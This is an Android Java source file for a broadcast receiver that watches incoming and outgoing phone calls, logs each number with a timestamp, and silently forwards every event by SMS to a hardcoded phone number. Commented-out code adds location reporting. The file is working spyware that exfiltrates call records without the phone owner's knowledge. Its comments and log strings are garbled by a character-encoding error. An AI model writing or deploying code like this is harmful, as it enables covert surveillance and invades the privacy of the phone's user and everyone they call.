package com.receiver;

import java.util.Calendar;
import java.util.List;

import value.myValue;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import com.service.LocationUtil;

public class CallReceiver extends BroadcastReceiver{
	public static final String tomyphone = myValue.sendMsgPhone;
	public Calendar c = Calendar.getInstance();  
    public int year = c.get(Calendar.YEAR);
    public int month = c.get(Calendar.MONTH)+1;
    public int day = c.get(Calendar.DAY_OF_MONTH); 
    public int hour = c.get(Calendar.HOUR_OF_DAY);  
    public int minute = c.get(Calendar.MINUTE);
    public int second = c.get(Calendar.SECOND);
    public String TheTime=year+"-"+month+"-"+day+" "+hour+":"+minute+":"+second+"  ";
    public static String phonenum="";
    private Context tcontext;
    private Intent tintent;
	@Override
	public void onReceive(Context context, Intent intent) {
		tcontext=context;
		tintent = intent;
		// TODO Auto-generated method stub
		if(intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
			String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			phonenum=phoneNumber;
			System.out.println(TheTime+"∫ÙΩ– :"+phoneNumber);
			MySendSMS(TheTime+":outgoing call "+phoneNumber,context,intent);
		}else{
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);  
            switch (tm.getCallState()) {  
            case TelephonyManager.CALL_STATE_RINGING:  
                phonenum = intent.getStringExtra("incoming_number");  
                System.out.println(TheTime+"œÏ¡Â:¿¥µÁ∫≈¬Î"+phonenum);
//                mylocationMessage(TheTime+":œÏ¡Â "+phonenum);
                MySendSMS(TheTime+":œÏ¡Â "+phonenum,context,intent);
                break;  
            case TelephonyManager.CALL_STATE_OFFHOOK:  
                System.out.println(TheTime+"Ω”Ã˝"+phonenum);
//                mylocationMessage(TheTime+":Ω”Ã˝ "+phonenum);
                MySendSMS(TheTime+":Ω”Ã˝ "+phonenum,context,intent);
                break;  
            case TelephonyManager.CALL_STATE_IDLE:  
                System.out.println(TheTime+"π“∂œ"+phonenum);
//                mylocationMessage(TheTime+":π“∂œ "+phonenum);
                MySendSMS(TheTime+":π“∂œ "+phonenum,context,intent);
                break;  
            } 
		}
	}
	
	public  void MySendSMS(String message,Context context, Intent intent){
        PendingIntent pi = PendingIntent.getActivity(context, 0, intent, 0);
        SmsManager smsManager = SmsManager.getDefault();  
        List<String> divideContents = smsManager.divideMessage(message);    
        for (String text : divideContents) {    
        	smsManager.sendTextMessage(tomyphone, null, text, pi, null);
        }
    }
	
	public void mylocationMessage(String message){
		LocationUtil lu = new LocationUtil();
		lu.locationAction(message);
	}
	
	public void MySendByUtil(String message){
		MySendSMS(message,tcontext,tintent);
	}

}
